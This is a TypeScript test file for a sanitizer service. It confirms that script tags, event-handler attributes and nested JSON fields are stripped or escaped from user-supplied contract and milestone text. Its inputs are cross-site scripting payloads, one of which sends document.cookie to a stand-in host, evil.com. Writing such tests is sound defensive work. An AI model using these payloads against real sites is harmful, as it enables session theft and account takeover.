import { describe, it } from 'node:test';
import assert from 'node:assert';
import { sanitizePayload, sanitizeString, escapeHtml } from '../src/services/sanitizer';

describe('Deep Security & Payload Sanitization E2E Tests', () => {
  it('strips dangerous HTML scripts and attributes from user milestone descriptions', () => {
    const maliciousInput =
      'Deliverable review <script>fetch("http://evil.com?c="+document.cookie)</script> and <img src=x onerror=alert(1)>';
    const cleaned = sanitizeString(maliciousInput);

    assert.ok(!cleaned.includes('<script>'));
    assert.ok(!cleaned.includes('onerror'));
    assert.ok(cleaned.includes('Deliverable review'));
  });

  it('escapes special characters to prevent cross-site scripting in rendered interfaces', () => {
    const raw = '<button onclick="exploit()">Click & Win</button>';
    const escaped = escapeHtml(raw);

    assert.ok(!escaped.includes('<button'));
    assert.ok(escaped.includes('&lt;button'));
    assert.ok(escaped.includes('&amp;'));
  });

  it('recursively sanitizes deeply nested JSON payloads', () => {
    const payload = {
      title: 'Valid Contract <script>alert("hack")</script>',
      metadata: {
        milestones: [
          { description: 'Milestone 1 <img src=x onerror=alert(2)>' },
          { description: 'Milestone 2 normal' },
        ],
      },
    };

    const sanitized = sanitizePayload(payload) as typeof payload;

    assert.ok(!sanitized.title.includes('<script>'));
    assert.ok(!sanitized.metadata.milestones[0].description.includes('onerror'));
    assert.strictEqual(sanitized.metadata.milestones[1].description, 'Milestone 2 normal');
  });
});
